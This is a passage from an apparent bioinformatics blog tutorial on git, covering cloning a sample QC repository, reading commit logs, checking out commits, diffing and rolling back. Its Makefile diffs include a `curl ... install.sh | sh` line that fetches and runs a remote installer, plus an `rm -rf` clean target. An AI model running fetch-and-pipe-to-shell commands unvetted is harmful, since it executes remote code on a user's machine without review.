<li class=""><strong>Part 1</strong>: History, basics, GitHub integration, and hands-on tutorials</li>
<li class=""><strong>Part 2 (This Post)</strong>: Local testing, CI/CD implementation, automated testing, and reproducible pipelines</li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>In this tutorial, we will:</p><ul>
<li class="">Add code to download data</li>
<li class="">Write scripts to use FastQC and MultiQC</li>
</ul></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="git-commands">Git commands<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#git-commands" class="hash-link" aria-label="Direct link to Git commands" title="Direct link to Git commands" translate="no">​</a></h2>
<p>This tutorial is fully committed via a GitHub repository. You can clone and checkout to specific branches to see how it is developed and committed.
First, clone the repository, then:</p>
<ul>
<li class="">Learn how to view commit history (branches are referenced by their names)</li>
<li class="">Learn how to checkout to a specific commit</li>
<li class="">Learn how to see the difference between the current commit and a specific commit</li>
</ul>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">To quit the git prompt, type <code>q</code></li>
<li class="">Create your own repository for a more practical approach</li>
<li class="">Check the differences in files, then copy them to your own repository to follow the tutorial</li>
</ul></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># clone</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> clone git@github.com:nttg8100/ngs-quality-control-for-blog-example.git</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> ngs-quality-control-for-blog-example</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># checkout to branch for the relevant tutorial step, e.g. feature/add-data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout feature/add-data</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-to-show-commit-log">How to show commit log<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#how-to-show-commit-log" class="hash-link" aria-label="Direct link to How to show commit log" title="Direct link to How to show commit log" translate="no">​</a></h3>
<p>Git provides commands to view the history and check the difference between two commits.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> log</span><br></span></code></pre></div></div>
<p>It will show details as below:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">commit ca29351295a4148bda73b6bf76a42cc7b834d1b6 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">HEAD -</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> feature/add-data, origin/feature/add-data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Author: Thanh-Giang </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">River</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> Tan Nguyen </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">nttg8100@gmail.com</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Date:   Mon Jan </span><span class="token number" style="color:hsl(35, 99%, 36%)">19</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">23</span><span class="token plain">:34:58 </span><span class="token number" style="color:hsl(35, 99%, 36%)">2026</span><span class="token plain"> +0700</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    feat: </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> makefile to get data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">commit 70d584a726fb5418274448a4f51ca07d94b104be </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">origin/main, origin/HEAD, main, feature/testing-rebase</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Merge: c731b9a 230795b</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Author: Thanh Giang Nguyen Tan </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token number" style="color:hsl(35, 99%, 36%)">64969412</span><span class="token plain">+nttg8100@users.noreply.github.com</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Date:   Sat Jan </span><span class="token number" style="color:hsl(35, 99%, 36%)">17</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">16</span><span class="token plain">:42:11 </span><span class="token number" style="color:hsl(35, 99%, 36%)">2026</span><span class="token plain"> +0700</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    Merge pull request </span><span class="token comment" style="color:hsl(230, 4%, 64%)">#1 from nttg8100/feature/environment-setup</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    feat: </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> pixi setup</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">commit 230795b7b8b03087ef7ee938d333161c9fcc0731 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">origin/feature/environment-setup</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Author: Thanh-Giang </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">River</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> Tan Nguyen </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">nttg8100@gmail.com</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Date:   Sat Jan </span><span class="token number" style="color:hsl(35, 99%, 36%)">17</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">15</span><span class="token plain">:05:28 </span><span class="token number" style="color:hsl(35, 99%, 36%)">2026</span><span class="token plain"> +0700</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    feat: </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> pixi setup</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">commit c731b9a80dfb22936bfcf94442bdf9b488a90d3c </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">feature/tesing-rebase</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Author: Thanh Giang Nguyen Tan </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token number" style="color:hsl(35, 99%, 36%)">64969412</span><span class="token plain">+nttg8100@users.noreply.github.com</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Date:   Wed Jan </span><span class="token number" style="color:hsl(35, 99%, 36%)">14</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">23</span><span class="token plain">:09:30 </span><span class="token number" style="color:hsl(35, 99%, 36%)">2026</span><span class="token plain"> +0700</span><br></span></code></pre></div></div>
<p>To see more precisely what you need:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> log </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--oneline</span><br></span></code></pre></div></div>
<p>The one-line format is good enough:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ca29351 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">HEAD -</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> feature/add-data, origin/feature/add-data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> feat: </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> makefile to get data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">70d584a </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">origin/main, origin/HEAD, main, feature/testing-rebase</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> Merge pull request </span><span class="token comment" style="color:hsl(230, 4%, 64%)">#1 from nttg8100/feature/environment-setup</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">230795b </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">origin/feature/environment-setup</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> feat: </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> pixi setup</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">c731b9a </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">feature/tesing-rebase</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> Initial commit</span><br></span></code></pre></div></div>
<p>Now you can see what I did on the repository. Following this tutorial, you can change to a specific commit to track it.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-to-checkout-to-specific-commit">How to checkout to specific commit<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#how-to-checkout-to-specific-commit" class="hash-link" aria-label="Direct link to How to checkout to specific commit" title="Direct link to How to checkout to specific commit" translate="no">​</a></h3>
<p>You can simply use the commit hash. For example, if I want to see all files from commit <code>230795b</code> which is on the branch <code>feature/testing-rebase</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout 230795b</span><br></span></code></pre></div></div>
<p>Now your code editor will show the files with content related to this commit.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-to-view-the-difference-between-two-commits-or-your-current-state">How to view the difference between two commits or your current state<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#how-to-view-the-difference-between-two-commits-or-your-current-state" class="hash-link" aria-label="Direct link to How to view the difference between two commits or your current state" title="Direct link to How to view the difference between two commits or your current state" translate="no">​</a></h3>
<p>If you have made changes to your files but have not committed them yet:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">diff</span><br></span></code></pre></div></div>
<p>I made a change and have not committed it here:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">diff</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--git</span><span class="token plain"> a/Makefile b/Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">index ae08113</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token plain">c2e5b87 </span><span class="token number" style="color:hsl(35, 99%, 36%)">100644</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">--- a/Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+++ b/Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">@@ -10,4 +10,6 @@ data/GSE110004:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> https://raw.githubusercontent.com/nf-core/test-datasets/rnaseq/testdata/GSE110004/SRR6357070_2.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> clean:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-       </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> data/GSE110004</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"> No newline at end of </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+       </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> data/GSE110004</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+Change here</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"> No newline at end of </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><br></span></code></pre></div></div>
<p>If you want to compare between two branches/commits:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">diff</span><span class="token plain"> ca29351</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token plain">70d584a</span><br></span></code></pre></div></div>
<p>The changes between the above commits:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">diff</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--git</span><span class="token plain"> a/.gitignore b/.gitignore</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">index cfca1e8</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token plain">1c3ecb3 </span><span class="token number" style="color:hsl(35, 99%, 36%)">100644</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">--- a/.gitignore</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+++ b/.gitignore</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">@@ -19,5 +19,3 @@ bin-release/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># pixi environments</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> .pixi/*</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">.pixi/config.toml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">diff</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--git</span><span class="token plain"> a/Makefile b/Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">index ae08113</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token plain">bcaa6d7 </span><span class="token number" style="color:hsl(35, 99%, 36%)">100644</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">--- a/Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+++ b/Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">@@ -1,13 +1,3 @@</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-       </span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sSL</span><span class="token plain"> https://pixi.dev/install.sh </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-data/GSE110004:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-       </span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> data/GSE110004</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-       </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> data/GSE110004 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-       </span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> https://raw.githubusercontent.com/nf-core/test-datasets/rnaseq/testdata/GSE110004/SRR6357070_1.fastq.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-       </span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> https://raw.githubusercontent.com/nf-core/test-datasets/rnaseq/testdata/GSE110004/SRR6357070_2.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-clean:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">-       </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> data/GSE110004</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"> No newline at end of </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">+       </span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sSL</span><span class="token plain"> https://pixi.dev/install.sh </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"> No newline at end of </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-to-roll-back">How to roll back<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#how-to-roll-back" class="hash-link" aria-label="Direct link to How to roll back" title="Direct link to How to roll back" translate="no">​</a></h3>
<p>If you checkout a specific commit and add a few changes to test according to the tutorial, <code>git</code> requires you to commit your changes.
You can simply roll back to the original version:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout -- </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><br></span></code></pre></div></div>
<p>Sometimes you want to get files from another branch. You can use:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">branch name</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">relative </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token plain"> path</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ex: git checkout main .gitignore</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="add-data">Add data<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#add-data" class="hash-link" aria-label="Direct link to Add data" title="Direct link to Add data" translate="no">​</a></h2>
<p>We need to create a new branch from updated main</p>
